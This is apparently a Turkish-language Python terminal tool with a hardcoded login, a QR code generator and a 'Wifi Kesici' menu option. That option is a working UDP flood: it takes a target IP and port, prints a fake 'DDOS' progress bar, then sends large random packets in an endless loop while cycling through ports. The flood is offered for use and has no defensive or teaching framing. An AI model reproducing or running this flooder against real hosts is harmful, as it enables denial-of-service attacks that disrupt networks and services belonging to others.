import os
import time
import socket
import random
import qrcode
from colorama import init, Fore, Style

init(autoreset=True)

def giris():
    while True:
        clear_screen()
        print(Fore.YELLOW + "╔════════════════════════════════════════╗")
        print("║            HOŞGELDİNİZ                 ║")
        print("╚════════════════════════════════════════╝" + Style.RESET_ALL)
        kullanici_adi = input(Fore.CYAN + "Kullanıcı Adı: " + Style.RESET_ALL)
        sifre = input(Fore.CYAN + "Şifre: " + Style.RESET_ALL)
        if kullanici_adi == "222" and sifre == "222":
            return True
        else:
            yanlis_sifre()

def yanlis_sifre():
    print(Fore.RED + "Hatalı giriş. Lütfen tekrar deneyin." + Style.RESET_ALL)
    input("Devam etmek için Enter'a basın.")

def ana_menu():
    while True:
        clear_screen()
        print(Fore.YELLOW + "╔════════════════════════════════════════╗")
        print("║                 MENÜ                   ║")
        print("╚════════════════════════════════════════╝" + Style.RESET_ALL)
        print("1. " + Fore.GREEN + "Tool" + Style.RESET_ALL)
        print("2. " + Fore.GREEN + "Wifi Kesici" + Style.RESET_ALL)
        print("3. " + Fore.GREEN + "QR Kod Oluşturma" + Style.RESET_ALL)
        print("4. " + Fore.GREEN + "Developer Hakkında Bilgi" + Style.RESET_ALL)
        print("5. " + Fore.RED + "Çıkış" + Style.RESET_ALL)

        secim = input(Fore.CYAN + "Seçiminizi yapın: " + Style.RESET_ALL)
        if secim == "1":
            tool_menu()
        elif secim == "2":
            wifi_kesici()
        elif secim == "3":
            qr_kodu_olustur_menu()
        elif secim == "4":
            developer_bilgi()
        elif secim == "5":
            print(Fore.RED + "Çıkış yapılıyor..." + Style.RESET_ALL)
            exit()
        else:
            input(Fore.RED + "Geçersiz seçim. Devam etmek için Enter'a basın." + Style.RESET_ALL)

def tool_menu():
    while True:
        clear_screen()
        print(Fore.YELLOW + "╔════════════════════════════════════════╗")
        print("║                TOOL MENÜ                ║")
        print("╚══════════════════════════════════════════════════╝" + Style.RESET_ALL)
        print("1. " + Fore.GREEN + "Paket Yükleme" + Style.RESET_ALL)
        print("2. " + Fore.GREEN + "Toola Giriş Menüsü" + Style.RESET_ALL)
        print("3. " + Fore.RED + "Ana Menüye Dön" + Style.RESET_ALL)

        secim = input(Fore.CYAN + "Seçiminizi yapın: " + Style.RESET_ALL)
        if secim == "1":
            print("Paket Yükleme seçildi.")
            input("Devam etmek için Enter'a basın.")
        elif secim == "2":
            print("Toola Giriş Menüsü seçildi.")
            input("Devam etmek için Enter'a basın.")
        elif secim == "3":
            return
        else:
            input(Fore.RED + "Geçersiz seçim. Devam etmek için Enter'a basın." + Style.RESET_ALL)

def wifi_kesici():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(10000)
    timeout =  time.time() 
    clear_screen()
    print(Fore.YELLOW + "╔════════════════════════════════════════╗")
    print("║           WİFİ KESİCİ                  ║")
    print("╚════════════════════════════════════════╝" + Style.RESET_ALL)
    ip = input(Fore.CYAN + "IP Hedefi: " + Style.RESET_ALL)
    port = int(input(Fore.CYAN + "Port: " + Style.RESET_ALL))
    clear_screen()
    print("\033[91mMission Start DDOS")
    print("\033[91m[                    ] 0% ")
    time.sleep(5)
    print("\033[92m[=====               ] 25%")
    time.sleep(5)
    print("\033[92m[==========          ] 50%")
    time.sleep(5)
    print("\033[92m[===============     ] 75%")
    time.sleep(5)
    print("\033[92m[====================] 100%")
    time.sleep(3)
    clear_screen()
    sent = 0
    while True:
        while 1:
            if time.time() > timeout:
                break
            else:
                pass
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print("\033[92mSent %s packet to %s throught port:%s successful"%(sent,ip,port))
        if port == 65534:
            port = 1

def qr_kodu_olustur_menu():
    clear_screen()
    print(Fore.YELLOW + "╔════════════════════════════════════════╗")
    print("║           QR KOD OLUŞTURUCU             ║")
    print("╚════════════════════════════════════════╝" + Style.RESET_ALL)
    metin = input(Fore.CYAN + "QR koduna dönüştürmek istediğiniz metni veya URL'yi girin: " + Style.RESET_ALL)
    dosya_adı = input(Fore.CYAN + "QR kodunun kaydedileceği dosya adını girin (örn: qr_kod.png): " + Style.RESET_ALL)
    qr_kod_olustur(metin, dosya_adı)
    print("Çıkış yapıyorlar. Güle güle!")

def qr_kod_olustur(metin, dosya_adı):
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(metin)
    qr.make(fit=True)

    img = qr.make_image(fill_color="black", back_color="white")
    img.save(dosya_adı)

    print(f"{dosya_adı} adlı QR kod dosyası oluşturuldu ve galerinize kaydedildi. Lütfen kontrol edin.")

def developer_bilgi():
    print("Developer Hakkında Bilgi seçildi.")
    input("Devam etmek için Enter'a basın.")

def clear_screen():
    os.system("clear")

def main():
    while True:
        if giris():
            ana_menu()

if __name__ == "__main__":
    main()

